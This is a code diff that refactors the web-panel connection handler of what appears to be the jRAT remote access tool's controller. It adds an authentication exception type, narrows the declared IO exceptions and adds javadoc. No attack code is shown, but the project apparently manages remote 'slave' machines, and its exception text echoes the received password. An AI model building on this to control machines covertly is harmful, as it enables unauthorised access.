@@ -2,10 +2,12 @@ package se.jrat.controller.webpanel;
 
 import java.io.BufferedReader;
 import java.io.BufferedWriter;
+import java.io.IOException;
 import java.io.InputStreamReader;
 import java.io.OutputStreamWriter;
 import java.net.Socket;
 
+import se.jrat.common.exceptions.AuthenticationException;
 import se.jrat.common.utils.MathUtils;
 import se.jrat.controller.AbstractSlave;
 import se.jrat.controller.Constants;
@@ -25,6 +27,12 @@ public class WebPanelConnection implements Runnable {
 	private BufferedReader br;
 	private BufferedWriter bw;
 
+	/**
+	 * Constructs new connection and handle incoming packets
+	 * @param parent The parent socket listener
+	 * @param socket The raw socket
+	 * @throws Exception
+	 */
 	public WebPanelConnection(WebPanelListener parent, Socket socket) throws Exception {
 		this.parent = parent;
 		this.socket = socket;
@@ -38,7 +46,7 @@ public class WebPanelConnection implements Runnable {
 			String pass = readLine();
 
             if (!pass.equals(parent.getHashedPassword())) {
-                throw new Exception("Failed to auth, got password " + pass);
+                throw new AuthenticationException("Failed to auth, got password " + pass);
             }
 
             int packet;
@@ -164,11 +172,21 @@ public class WebPanelConnection implements Runnable {
 		}
 	}
 
-	public String readLine() throws Exception {
+	/**
+	 * Reads line from socket and trim()'s it
+	 * @return Trimmed string
+	 * @throws IOException
+	 */
+	public String readLine() throws IOException {
 		return br.readLine().trim();
 	}
 
-	public int readNumber() throws Exception {
+	/**
+	 * Reads number from socket
+	 * @return The number as integer
+	 * @throws IOException
+	 */
+	public int readNumber() throws IOException {
 		return Integer.parseInt(readLine());
 	}
 }
